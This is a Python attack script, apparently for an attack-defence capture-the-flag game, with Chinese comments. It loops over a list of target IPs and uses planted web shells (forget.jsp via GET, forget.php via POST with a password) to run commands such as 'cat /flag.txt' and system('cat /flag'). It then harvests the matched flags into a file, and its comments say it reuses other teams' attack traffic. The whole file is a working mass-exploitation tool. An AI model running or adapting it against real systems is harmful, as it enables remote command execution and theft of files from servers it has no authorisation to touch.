import re
import requests
import logging

FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)


def get(iplist):
    res = {}
    for i in range(0, len(iplist)):
        try:
            ip = iplist[i]
            url = 'http://' + ip + 'forget.jsp?cmd1=cat%20/flag.txt'  # 别人的攻击流量
            r = requests.get(url=url, timeout=3)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{ip} found flag: {flag}")
                    res[ip] = flag
                else:
                    logging.warning(f"{ip} status_code=200 but no flag")
            else:
                logging.warning(f"{ip} status_code: {r.status_code}")
        except Exception as e:
            logging.error(f"{ip} request failed: {e}")
    return res


def post(iplist):
    res = {}
    payload = {
        "passwd": "zzyInvincible",  # 用别人的
        "cmd": "system('cat /flag');",
    }
    for i in range(0, len(iplist)):
        try:
            ip = iplist[i]
            url = 'http://' + ip + 'forget.php'  # 别人的攻击流量
            r = requests.post(url=url, data=payload, timeout=3)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{ip} found flag: {flag}")
                    res[ip] = flag
                else:
                    logging.warning(f"{ip} status_code=200 but no flag")
            else:
                logging.warning(f"{ip} status_code: {r.status_code}")
        except Exception as e:
            logging.error(f"{ip} request failed: {e}")
    return res


iplist = []

# 打开文件
with open('ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        iplist.append(line.strip())
        # 读取下一行
        line = file.readline()

res = get(iplist)
# res=post(iplist)
if res:
    with open('flag.txt', 'w', encoding='utf-8') as file:
        for ip, flag in res.items():
            file.write(f"{ip} flag: {flag}\n")
